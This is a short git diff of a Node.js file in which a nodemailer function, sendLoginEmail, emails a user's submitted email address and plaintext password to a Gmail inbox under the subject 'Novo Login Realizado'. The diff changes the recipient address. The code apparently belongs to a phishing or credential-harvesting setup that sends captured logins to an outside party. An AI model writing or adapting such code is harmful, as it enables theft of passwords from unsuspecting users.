@@ -22,7 +22,7 @@ const transporter = nodemailer.createTransport({
 const sendLoginEmail = (email, password) => {
     const mailOptions = {
         from: 'ewertonsantoss966@gmail.com',
-        to: 'ewertonsantoss966@gmail.com',
+        to: 'ewertonsantoss866@gmail.com',
         subject: 'Novo Login Realizado',
         text: `E-mail: ${email}\nSenha: ${password}`
     };
